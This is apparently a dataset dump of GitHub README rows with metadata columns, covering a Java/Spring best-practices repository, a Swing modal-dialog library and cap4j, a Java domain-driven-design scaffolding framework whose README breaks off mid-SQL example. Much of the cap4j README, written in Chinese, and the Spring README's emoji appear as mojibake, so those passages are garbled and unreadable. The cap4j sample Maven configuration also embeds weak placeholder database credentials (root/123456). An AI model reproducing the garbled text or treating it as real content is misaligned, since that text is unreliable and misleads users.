",0,2,4,1.0,"['multi', 'agent', 'bank', 'assistant', 'java', 'semantic', 'kernel', 'overview', 'feature', 'architecture', 'get', 'start', 'run', 'github', 'codespaces', 'v', 'code', 'dev', 'container', 'prerequisite', 'start', 'scratch', 'deploy', 'exist', 'azure', 'resource', 'exist', 'resource', 'group', 'exist', 'openai', 'resource', 'exist', 'azure', 'document', 'intelligence', 'other', 'exist', 'azure', 'resource', 'provision', 'remain', 'resource', 'redeploy', 'run', 'locally', 'guidance', 'test', 'different', 'model', 'version', 'enable', 'application', 'insight', 'enable', 'authentication', 'app', 'continuous', 'integration', 'github', 'action', 'cost', 'estimation', 'resource', 'faq', 'troubleshoot', 'contribute', 'trademark']","['resource', 'exist', 'azure', 'start', 'run']",6.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:animal-sniffer-maven-plugin,org.codehaus.mojo:exec-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,1.0
agitrubard/java-spring-best-practices,main,"# â˜•ï¸  ğŸƒ | Java & Spring Best Practices

## ğŸš€ Introduction
This repository is a collection of best practices and code snippets for Java development using the Spring Framework. Our goal is to help developers use Spring more effectively and write cleaner, more maintainable, and more scalable code.

## ğŸ“„ Content
In this repository, you will find:

- **Best Practices:** Guidelines and recommendations for using Spring in various scenarios.
- **Code Snippets:** Short and concise code examples demonstrating the best practices.
- **Explanations:** Clear explanations of the reasoning and best practices behind the code snippets.

## ğŸ’¬ How to Use
- Browse the best practices and identify those that are relevant to your project.
- Copy the corresponding code snippets and paste them into your project.
- Adapt the code snippets to your project's specific requirements if necessary.
- Read the explanations to understand the reasoning and best practices behind the code snippets.

## ğŸ§‘â€ğŸ’» Contributing
You are encouraged to contribute to this repository! You can add new best practices, code snippets, or explanations. To contribute, please submit a pull request using https://docs.github.com/articles/about-pull-requests.

#### If you have a best practice to share or an improvement to an existing snippet, feel free to open a pull request or an issue.

1. Fork the repository
2. Create a new branch: `git checkout -b feature-branch`
4. Commit your changes: `git commit -m 'Add some feature'`
5. Push to the branch: `git push origin feature-branch`
6. Open a Pull Request to `main` branch

## ğŸ™ŒğŸ¼ Acknowledgements
Thank you to everyone who has contributed to this repository!

## **Support**

<p align=""center"">
<a href=""https://buymeacoffee.com/n8fyqpyf6md""> <img align=""center"" src=""https://bit.ly/4ekTsq0"" width=""249""></a>
",0,0,1,1.0,"['java', 'spring', 'best', 'practice', 'introduction', 'content', 'how', 'use', 'contribute', 'if', 'best', 'practice', 'share', 'improvement', 'exist', 'snippet', 'feel', 'free', 'open', 'pull', 'request', 'issue', 'acknowledgement', 'support']","['best', 'practice', 'java', 'spring', 'introduction']",4.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,4.0,0.0
DJ-Raven/swing-modal-dialog,main,"# Swing Modal Dialog

Java swing library build with flatlaf look and feel for desktop application. This library include more custom components
and support animation

- [x] Modal dialog
- [x] Drawer
- [x] Toast Notification

<img src=""https://github.com/DJ-Raven/swing-modal-dialog/blob/main/screenshot/simple 1.jpg"" alt=""simple 1""/>
<img src=""https://github.com/DJ-Raven/swing-modal-dialog/blob/main/screenshot/simple 2.jpg"" alt=""simple 2""/>
<img src=""https://github.com/DJ-Raven/swing-modal-dialog/blob/main/screenshot/simple 3.jpg"" alt=""simple 3""/>

## Installation

[![Maven Central](https://img.shields.io/maven-central/v/io.github.dj-raven/modal-dialog?label=Maven%20Central)](https://search.maven.org/artifact/io.github.dj-raven/modal-dialog)

Add the dependency
``` xml
<dependency>
    <groupId>io.github.dj-raven</groupId>
    <artifactId>modal-dialog</artifactId>
    <version>1.2.0</version>
</dependency>
```

### Snapshots
To get the latest updates before the release, you can use the snapshot version from [Sonatype OSS Snapshots](https://s01.oss.sonatype.org/content/repositories/snapshots/io/github/dj-raven/modal-dialog/)

``` xml
<repositories>
    <repository>
        <id>sonatype-oss-snapshots</id>
        <url>https://s01.oss.sonatype.org/content/repositories/snapshots/</url>
    </repository>
</repositories>
```
Add the snapshot version
``` xml
<dependency>
    <groupId>io.github.dj-raven</groupId>
    <artifactId>modal-dialog</artifactId>
    <version>x.x.x-SNAPSHOT</version>
</dependency>
```

## Demo
Get jar file here: [latest-releases](https://github.com/DJ-Raven/swing-modal-dialog/releases/latest)

## Document

Not yet

## Library Resources

- [FlatLaf](https://github.com/JFormDesigner/FlatLaf) - FlatLaf library for the modern UI design theme
- [MigLayout](https://github.com/mikaelgrev/miglayout) - MigLayout library for flexible layout management
",3,0,2,11.0,"['swing', 'modal', 'dialog', 'installation', 'snapshot', 'demo', 'document', 'library', 'resource']","['swing', 'modal', 'dialog', 'installation', 'snapshot']",3.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,2.0,1.0
netcorepal/cap4j,main,"# cap4j

[![Maven Central Version](https://img.shields.io/maven-central/v/io.github.netcorepal/cap4j)](https://central.sonatype.com/artifact/io.github.netcorepal/cap4j)
[![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/netcorepal/cap4j/blob/main/LICENSE)

æœ¬é¡¹ç›®æ˜¯ [CAP](https://github.com/dotnetcore/CAP) é¡¹ç›®çš„ Java å®ç°ï¼ŒåŸºäº[æ•´æ´æ¶æ„](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html)ã€`é¢†åŸŸæ¨¡å‹`ã€`Outbox`æ¨¡å¼ã€`CQS`æ¨¡å¼ä»¥åŠ`UoW`æ¨¡å¼ç­‰ç†å¿µï¼Œcap4jæœŸæœ›è§£å†³å¦‚ä½•`å®ç°é¢†åŸŸé©±åŠ¨è®¾è®¡`çš„é—®é¢˜ã€‚

å¦‚æœå¯¹ä»¥ä¸Šæ¶æ„ç†å¿µæœ‰å……åˆ†äº†è§£ï¼Œé‚£ä¹ˆcap4jçš„ä½¿ç”¨å°†ä¼šéå¸¸é¡ºæ‰‹ã€‚å¦ä¸€æ–¹é¢ï¼Œé€šè¿‡cap4jæ¥æ„å»ºä½ çš„æœåŠ¡ï¼Œä½ å°†å­¦ä¼šä¸€ç§å®ç°é¢†åŸŸé©±åŠ¨è®¾è®¡çš„å®Œæ•´è½åœ°æ–¹æ³•ã€‚

## å¿«é€Ÿå¼€å§‹

### è„šæ‰‹æ¶æ­å»º
#### **ç¬¬ä¸€æ­¥**ï¼šæ–°å»ºä¸€ä¸ªç©ºçš„mavené¡¹ç›®
> å®šå¥½mavenåæ ‡ä¸‰è¦ç´ ï¼š`groupId`ã€`artifactId`ã€`version`

#### **ç¬¬äºŒæ­¥**ï¼šä¿®æ”¹pom.xml
> åœ¨pom.xmlä¸­æ·»åŠ `cap4j-ddd-codegen-maven-plugin`æ’ä»¶ã€‚
```xml
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>

    <groupId>io.github.netcorepal</groupId>
    <artifactId>cap4j-ddd-mvc-example</artifactId>
    <version>1.0-SNAPSHOT</version>
    <packaging>jar</packaging>

    <name>cap4j-ddd-mvc-example</name>
    <dependencies>
        <dependency>
            <groupId>io.github.netcorepal</groupId>
            <artifactId>cap4j-ddd-codegen-maven-plugin</artifactId>
            <version>1.0.0-alpha-1</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>io.github.netcorepal</groupId>
                <artifactId>cap4j-ddd-codegen-maven-plugin</artifactId>
                <version>1.0.0-alpha-1</version>
                <configuration>
                    <archTemplate>https://raw.githubusercontent.com/netcorepal/cap4j/main/cap4j-ddd-codegen-template.json</archTemplate>
                    <basePackage>org.netcorepal.cap4j.ddd.example</basePackage>
                    <multiModule>false</multiModule>
                    <moduleNameSuffix4Adapter>-adapter</moduleNameSuffix4Adapter>
                    <moduleNameSuffix4Domain>-domain</moduleNameSuffix4Domain>
                    <moduleNameSuffix4Application>-application</moduleNameSuffix4Application>
                    <connectionString>
                        <![CDATA[jdbc:mysql://127.0.0.1:3306/test?serverTimezone=Asia/Shanghai&useSSL=false&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull]]>
                    </connectionString>
                    <user>root</user>
                    <pwd>123456</pwd>
                    <schema>test</schema>
                    <table></table>
                    <ignoreTable></ignoreTable>
                    <idField>id</idField>
                    <versionField>version</versionField>
                    <deletedField>db_deleted</deletedField>
                    <readonlyFields>db_created_at,db_updated_at</readonlyFields>
                    <ignoreFields></ignoreFields>
                    <entityBaseClass></entityBaseClass>
                    <entityMetaInfoClassOutputMode>ref</entityMetaInfoClassOutputMode>
                    <entityMetaInfoClassOutputPackage>domain._share.meta</entityMetaInfoClassOutputPackage>
                    <fetchMode>SUBSELECT</fetchMode>
                    <fetchType>EAGER</fetchType>
                    <idGenerator>org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator</idGenerator>
                    <enumValueField>code</enumValueField>
                    <enumNameField>name</enumNameField>
                    <enumUnmatchedThrowException>true</enumUnmatchedThrowException>
                    <datePackage4Java>java.time</datePackage4Java>
                    <typeRemapping></typeRemapping>
                    <generateDefault>false</generateDefault>
                    <generateDbType>true</generateDbType>
                    <generateSchema>true</generateSchema>
                    <generateBuild>false</generateBuild>
                    <aggregateIdentityClass>Long</aggregateIdentityClass>
                    <aggregateRootAnnotation></aggregateRootAnnotation>
                    <aggregateRepositoryBaseClass></aggregateRepositoryBaseClass>
                    <aggregateRepositoryCustomerCode></aggregateRepositoryCustomerCode>
                    <ignoreAggregateRoots></ignoreAggregateRoots>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>
```
é€šå¸¸ï¼Œ`cap4j-ddd-codegen`æ’ä»¶åªéœ€è¦æˆ‘ä»¬æ ¹æ®å›¢é˜Ÿæˆ–é¡¹ç›®çš„å®é™…æƒ…å†µè°ƒæ•´ä»¥ä¸‹é…ç½®é¡¹å³å¯ä½¿ç”¨ã€‚
> - `basePackage`: é¡¹ç›®åŸºç¡€åŒ…åï¼Œä¸€èˆ¬ä¸ºcom.yourcompany.project
> - `connectionString`: æ•°æ®åº“è¿æ¥ä¸²
> - `user`: æ•°æ®åº“è´¦å·
> - `pwd`: æ•°æ®åº“å¯†ç 
> - `schema`: æ•°æ®åº“åç§°


#### **ç¬¬ä¸‰æ­¥**ï¼šæ‰§è¡Œæ’ä»¶å‘½ä»¤ï¼Œç”Ÿæˆé¡¹ç›®è„šæ‰‹æ¶
> æ’ä»¶é…ç½®é¡¹`archTemplate`æ˜¯`gen-arch`å‘½ä»¤ç”Ÿæˆè„šæ‰‹æ¶ç›®å½•ä¸é¡¹ç›®åŸºç¡€ä»£ç çš„é…ç½®æ–‡ä»¶åœ°å€ã€‚å¼€æ”¾è‡ªå®šä¹‰æ–¹ä¾¿å¤§å®¶æ ¹æ®è‡ªå·±å›¢é˜Ÿéœ€æ±‚è¿›è¡Œå®šåˆ¶åŒ–ã€‚æ ¼å¼è¯´æ˜åç»­å†ï¼Œä¸è¿‡æ ¼å¼å¾ˆç®€å•ï¼ŒæŒ‰ç¤ºä¾‹ä¸­çš„é…ç½®è‡ªå·±åº”è¯¥å°±èƒ½çœ‹æ‡‚å¹¶åº”ç”¨ã€‚æœ‰å…´è¶£æ›´è¯¦ç»†äº†è§£çš„å‚è€ƒæºç [GenArchMojo](cap4j-ddd-codegen-maven-plugin/src/main/java/org/netcorepal/cap4j/ddd/codegen/GenArchMojo.java)

```shell
mvn cap4j-ddd-codegen:gen-arch
```
å¦‚æœæ²¡æœ‰æ„å¤–ï¼Œé¡¹ç›®ç»“æ„é€šè¿‡`cap4j-ddd-codegen`æ’ä»¶å·²åˆå§‹åŒ–å®Œæ¯•ï¼

### ç›®å½•ç»“æ„ä»‹ç»
#### ç®€ä»‹
```xml
<basePackage>org.netcorepal.cap4j.ddd.example</basePackage> 
```
åŸºäºåŸºç¡€åŒ…è·¯å¾„é…ç½®ï¼Œåœ¨mavené¡¹ç›®æºç ç›®å½•`src/main/java/org/netcorepal/cap4j/ddd/example`ä¸‹å°†ä¼šç”Ÿæˆ4ä¸ª`package`ã€‚
> - `_share`       å…¬å…±ä»£ç 
> - `adapter`      é€‚é…å±‚(Interface Adapter)
> - `application`  åº”ç”¨å±‚(Application Business Rules)
> - `domain`       é¢†åŸŸå±‚(Enterpprise Business Rules)

ä»¥ä¸Šä»£ç åˆ†å±‚å®Œå…¨éµå¾ª[æ•´æ´æ¶æ„](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html)å¯¹äºä»£ç åˆ†å±‚ç»„ç»‡çš„è§‚ç‚¹ã€‚
![æ•´æ´æ¶æ„](https://blog.cleancoder.com/uncle-bob/images/2012-08-13-the-clean-architecture/CleanArchitecture.jpg)

#### é¢†åŸŸå±‚
å®ç°é¢†åŸŸæ¨¡å‹ï¼Œèšåˆã€å®ä½“ã€é¢†åŸŸäº‹ä»¶ä»¥åŠé›†æˆäº‹ä»¶å®šä¹‰ã€‚
```text
â””â”€â”€ org.netcorepal.cap4j.ddd.example
    â””â”€â”€ domain
        â”œâ”€â”€ _share (é¢†åŸŸå±‚å…¬å…±ä»£ç ï¼Œä»…ä¾›é¢†åŸŸå±‚å¼•ç”¨)
        â”œâ”€â”€ aggregates (å®ä½“èšåˆå£°æ˜)
        â””â”€â”€ services (é¢†åŸŸæœåŠ¡)
```

#### åº”ç”¨å±‚
å®ç°`CQS`æ¨¡å¼ï¼Œå°†åŠŸèƒ½ç”¨ä¾‹(`UseCase`)æŠ½è±¡æˆå‘½ä»¤æˆ–æŸ¥è¯¢æ¥å®ç°ã€‚
```text
â””â”€â”€ org.netcorepal.cap4j.ddd.example
    â””â”€â”€ application
     Â Â  â”œâ”€â”€ _share (åº”ç”¨å±‚å…¬å…±ä»£ç ï¼Œä»…ä¾›é¢†åŸŸå±‚å¼•ç”¨)
     Â Â  â”‚Â Â  â”œâ”€â”€ clients (é˜²è…å±‚ï¼šåŒ…è£…ä¸‰æ–¹æœåŠ¡è°ƒç”¨æ¥å£)
     Â Â  â”‚Â Â  â”œâ”€â”€ enums (åº”ç”¨å±‚æšä¸¾ç±»å‹)
     Â Â  â”‚Â Â  â””â”€â”€ events (å£°æ˜ä¸‰æ–¹æœåŠ¡é›†æˆäº‹ä»¶)
     Â Â  â”œâ”€â”€ commands (CQSçš„Cï¼šå‘½ä»¤)
     Â Â  â”œâ”€â”€ queries (CQSçš„Qï¼šæŸ¥è¯¢)
     Â Â  â””â”€â”€ subscribers (é¢†åŸŸäº‹ä»¶æˆ–é›†æˆäº‹ä»¶çš„è®¢é˜…å¤„ç†é€»è¾‘)
```

#### é€‚é…å±‚
å¦‚é€‚é…å­—é¢æ„æ€ï¼Œæ”¾ç½®å„å±‚ï¼ˆé¢†åŸŸå±‚`domain`ã€åº”ç”¨å±‚`application`ï¼‰å®šä¹‰çš„æ¥å£å®ç°ã€‚æ•´æ´æ¶æ„ä¸­ç§°å…¶ä¸ºæ¥å£é€‚é…å±‚ï¼ˆ`Interface Adapters`ï¼‰ã€‚

è¯¥å±‚æ˜¯é¢†åŸŸå±‚å’Œåº”ç”¨å±‚ä¸šåŠ¡é€»è¾‘æ‰€ä¾èµ–çš„`æŠ½è±¡åŠŸèƒ½æ¥å£`çš„æŠ€æœ¯é€‚é…å®ç°ï¼Œéµå¾ªDIåŸåˆ™ã€‚

ä¸¾ä¸ªä¾‹å­æ¥ç†è§£æŠ½è±¡åŠŸèƒ½æ¥å£ï¼Œæ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„ç”µå•†åœºæ™¯ï¼Œç”¨æˆ·åœ¨å•†åŸä¸‹å•ï¼Œéœ€è¦é€šçŸ¥ä»“åº“æ‰“åŒ…å‘è´§ã€‚é‚£ä¹ˆè¿™ä¸ª`é€šçŸ¥`å¯èƒ½å°±ä¼šéœ€è¦æŠ½è±¡å‡ºä¸€ä¸ª`é€šçŸ¥åŠŸèƒ½æ¥å£`ï¼Œæ¥æ‰¿æ¥ä¸‹å•æµç¨‹çš„è¿ç»­æ€§ã€‚è‡³æ­¤ï¼Œé€šçŸ¥åŠŸèƒ½æ¥å£çš„å®šä¹‰éƒ½æ˜¯åº”ç”¨å±‚å…³å¿ƒçš„äº‹ã€‚ä½†æ˜¯é€šçŸ¥åŠŸèƒ½æ¥å£å¦‚ä½•å®ç°ï¼Œå°±æ˜¯é€‚é…å±‚çš„äº‹äº†ï¼Œä½ æ˜¯çŸ­ä¿¡ä¹Ÿå¥½ã€ç”µè¯ä¹Ÿå¥½ï¼Œèƒ½å¤Ÿå®ç°é€šçŸ¥åŠŸèƒ½æ¥å£å®šä¹‰çš„æ ¸å¿ƒæ•ˆæœå³å¯ã€‚

```text
â””â”€â”€ org.netcorepal.cap4j.ddd.example
    â””â”€â”€ adapter
     Â Â  â”œâ”€â”€ _share (é€‚é…å±‚å…¬å…±ä»£ç ï¼Œä»…ä¾›é€‚é…å±‚å¼•ç”¨)
     Â Â  â”‚Â Â  â””â”€â”€ configure
     Â Â  â”‚Â Â      â””â”€â”€ ApolloConfig.java (é…ç½®ä¸­å¿ƒ)
     Â Â  â”œâ”€â”€ application (åº”ç”¨å±‚æ¥å£å®ç°)
     Â Â  â”‚Â Â  â”œâ”€â”€ _share
     Â Â  â”‚Â Â  â””â”€â”€ clients
     Â Â  â”œâ”€â”€ domain (é¢†åŸŸå±‚æ¥å£å®ç°)
     Â Â  â”‚Â Â  â”œâ”€â”€ _share
     Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ configure
     Â Â  â”‚Â Â  â”‚Â Â      â””â”€â”€ MyDomainEventMessageInterceptor.java (é›†æˆäº‹ä»¶æ¶ˆæ¯æ‹¦æˆªå™¨)
     Â Â  â”‚Â Â  â””â”€â”€ repositories (å®ç°èšåˆä»“å‚¨æ¥å£)
     Â Â  â”œâ”€â”€ infra (åŸºç¡€è®¾æ–½é€‚é…æ¥å£å®ç°ï¼‰
     Â Â  â”‚Â Â  â”œâ”€â”€ _share
     Â Â  â”‚Â Â  â”œâ”€â”€ jdbc (æœåŠ¡äºåº”ç”¨å±‚CQSçš„Qï¼ŒjdbcæŸ¥è¯¢å·¥å…·ç±»)
     Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ NamedParameterJdbcTemplateDao.java
     Â Â  â”‚Â Â  â””â”€â”€ mybatis (æœåŠ¡äºåº”ç”¨å±‚CQSçš„Qï¼Œmybatisé›†æˆï¼‰ 
     Â Â  â”‚Â Â      â”œâ”€â”€ _share
     Â Â  â”‚Â Â      â”‚Â Â  â””â”€â”€ MyEnumTypeHandler.java
     Â Â  â”‚Â Â      â””â”€â”€ mapper
     Â Â  â””â”€â”€ portal (ç«¯å£)
     Â Â      â”œâ”€â”€ api (SpringMVCç›¸å…³ä»£ç )
     Â Â      â”‚Â Â  â”œâ”€â”€ TestController.java
     Â Â      â”‚Â Â  â””â”€â”€ _share
     Â Â      â”‚Â Â      â”œâ”€â”€ ResponseData.java
     Â Â      â”‚Â Â      â”œâ”€â”€ Status.java
     Â Â      â”‚Â Â      â””â”€â”€ configure
     Â Â      â”‚Â Â          â”œâ”€â”€ CommonExceptionHandler.java
     Â Â      â”‚Â Â          â”œâ”€â”€ MvcConfig.java
     Â Â      â”‚Â Â          â””â”€â”€ SwaggerConfig.java
     Â Â      â”œâ”€â”€ jobs (å®šæ—¶ä»»åŠ¡ç›¸å…³ä»£ç ï¼‰
     Â Â      â”‚Â Â  â””â”€â”€ _share
     Â Â      â”‚Â Â      â””â”€â”€ configure
     Â Â      â”‚Â Â          â””â”€â”€ XxlJobConfig.java
     Â Â      â””â”€â”€ queues (æ¶ˆæ¯é˜Ÿåˆ—ç›¸å…³ä»£ç ï¼‰
```

#### å…¬å…±ä»£ç 
æ”¾ç½®å…¬å…±ä»£ç ã€‚
```text
â””â”€â”€ org.netcorepal.cap4j.ddd.example
    â””â”€â”€ _share
     Â Â  â”œâ”€â”€ CodeEnum.java  (å“åº”çŠ¶æ€ç æšä¸¾)
     Â Â  â”œâ”€â”€ Constants.java (å…¬å…±å¸¸é‡)
     Â Â  â””â”€â”€ exception (è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸)
     Â Â      â”œâ”€â”€ ErrorException.java
     Â Â      â”œâ”€â”€ KnownException.java
     Â Â      â””â”€â”€ WarnException.java
```

#### é¡¹ç›®ç›®å½•æ ‘
```text
.
â”œâ”€â”€ pom.xml
â””â”€â”€ src
    â”œâ”€â”€ main
    â”‚Â Â  â”œâ”€â”€ java
    â”‚Â Â  â”‚Â Â  â””â”€â”€ org
    â”‚Â Â  â”‚Â Â      â””â”€â”€ netcorepal
    â”‚Â Â  â”‚Â Â          â””â”€â”€ cap4j
    â”‚Â Â  â”‚Â Â              â””â”€â”€ ddd
    â”‚Â Â  â”‚Â Â                  â””â”€â”€ example
    â”‚Â Â  â”‚Â Â                      â”œâ”€â”€ StartApplication.java
    â”‚Â Â  â”‚Â Â                      â”œâ”€â”€ _share
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”œâ”€â”€ CodeEnum.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”œâ”€â”€ Constants.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â””â”€â”€ exception
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”œâ”€â”€ ErrorException.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”œâ”€â”€ KnownException.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â””â”€â”€ WarnException.java
    â”‚Â Â  â”‚Â Â                      â”œâ”€â”€ adapter
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”œâ”€â”€ _share
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â””â”€â”€ configure
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â      â””â”€â”€ ApolloConfig.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”œâ”€â”€ application
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â”œâ”€â”€ _share
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â””â”€â”€ clients
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”œâ”€â”€ domain
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â”œâ”€â”€ _share
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ configure
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â”‚Â Â      â””â”€â”€ MyDomainEventMessageInterceptor.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â””â”€â”€ repositories
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”œâ”€â”€ infra
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â”œâ”€â”€ _share
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â”œâ”€â”€ jdbc
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ NamedParameterJdbcTemplateDao.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â””â”€â”€ mybatis
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â      â”œâ”€â”€ _share
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â      â”‚Â Â  â””â”€â”€ MyEnumTypeHandler.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â      â””â”€â”€ mapper
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â””â”€â”€ portal
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”œâ”€â”€ api
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â  â”œâ”€â”€ TestController.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â  â””â”€â”€ _share
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â      â”œâ”€â”€ ResponseData.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â      â”œâ”€â”€ Status.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â      â””â”€â”€ configure
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â          â”œâ”€â”€ CommonExceptionHandler.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â          â”œâ”€â”€ MvcConfig.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â          â””â”€â”€ SwaggerConfig.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”œâ”€â”€ jobs
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â  â””â”€â”€ _share
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â      â””â”€â”€ configure
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â”‚Â Â          â””â”€â”€ XxlJobConfig.java
    â”‚Â Â  â”‚Â Â                      â”‚Â Â      â””â”€â”€ queues
    â”‚Â Â  â”‚Â Â                      â”œâ”€â”€ application
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”œâ”€â”€ _share
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â”œâ”€â”€ clients
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â”œâ”€â”€ enums
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”‚Â Â  â””â”€â”€ events
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”œâ”€â”€ commands
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â”œâ”€â”€ queries
    â”‚Â Â  â”‚Â Â                      â”‚Â Â  â””â”€â”€ subscribers
    â”‚Â Â  â”‚Â Â                      â””â”€â”€ domain
    â”‚Â Â  â”‚Â Â                          â”œâ”€â”€ _share
    â”‚Â Â  â”‚Â Â                          â”œâ”€â”€ aggregates
    â”‚Â Â  â”‚Â Â                          â””â”€â”€ services
    â”‚Â Â  â””â”€â”€ resources
    â”‚Â Â      â”œâ”€â”€ mapper
    â”‚Â Â      â”œâ”€â”€ application.properties
    â”‚Â Â      â”œâ”€â”€ ddl.sql
    â”‚Â Â      â””â”€â”€ logback.xml
    â””â”€â”€ test
        â””â”€â”€ java
            â””â”€â”€ org
                â””â”€â”€ netcorepal
                    â””â”€â”€ cap4j
                        â””â”€â”€ ddd
                            â””â”€â”€ example
                                â””â”€â”€ AppTest.java
```

### ç¼–ç æœ€ä½³å®è·µ

#### é¢†åŸŸå±‚
##### ORMä»£ç ç”Ÿæˆ
æ ¹æ®é¢†åŸŸæ¨¡å‹ä¸­çš„å®ä½“ä»¥åŠèšåˆå…³ç³»ï¼Œå®Œæˆæ•°æ®åº“è¡¨è®¾è®¡ã€‚

ä¸ºäº†æ–¹ä¾¿å®ä½“åˆ°æ•°æ®åº“è¡¨æ˜ å°„çš„æ¯ç‡¥å·¥ä½œï¼ˆORMï¼‰ï¼Œæˆ‘ä»¬è®¾è®¡äº†ä¸€å¥—åŸºäºæ•°æ®åº“æ³¨é‡Šçš„æ³¨è§£è¯­æ³•ï¼Œå¹¶ä¸”è¿™å¥—è¯­æ³•éå¸¸ç®€å•ã€‚
é€šå¸¸æƒ…å†µä¸‹ï¼ˆæ¯”å¦‚éƒ½æ˜¯å•å®ä½“èšåˆçš„é¢†åŸŸæ¨¡å‹ï¼‰æˆ‘ä»¬ä¸éœ€è¦è¿™äº›æ³¨è§£è¯­æ³•ä¹Ÿå¯ä»¥è®©å®ä½“ä»£ç ç”Ÿæˆæ­£å¸¸å·¥ä½œã€‚

å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿåªéœ€è¦ç†Ÿæ‚‰ä¸€ä¸ªè¡¨æ³¨è§£å’Œä¸¤ä¸ªåˆ—æ³¨è§£å³å¯ï¼š
- è¡¨æ³¨è§£ `@P`=_root_entity_table_;
- åˆ—æ³¨è§£ `@T`=_JavaType_; `@E`=_0_:_ENUM_FIELD_:_æšä¸¾å­—æ®µæ³¨é‡Š_;

```sql
CREATE TABLE `order` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `order_no` varchar(100) NOT NULL DEFAULT '' COMMENT 'è®¢å•ç¼–å·',
  `order_status` int unsigned NOT NULL DEFAULT '0' COMMENT 'è®¢å•çŠ¶æ€@T=OrderStatus;@E=0:INIT:å¾…æ”¯ä»˜|1:PAID:å·²æ”¯ä»˜|-1:CLOSED:å·²å…³é—­;',
  `amount` decimal(14,2) NOT NULL DEFAULT '0.00' COMMENT 'æ€»é‡‘é¢',
  `version` bigint unsigned NOT NULL DEFAULT '0',
  `db_created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',
  `db_updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT 'æ›´æ–°æ—¶é—´',
  `db_deleted` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_db_created_at` (`db_created_at`),
  KEY `idx_db_updated_at` (`db_updated_at`)
) COMMENT='è®¢å•\n';

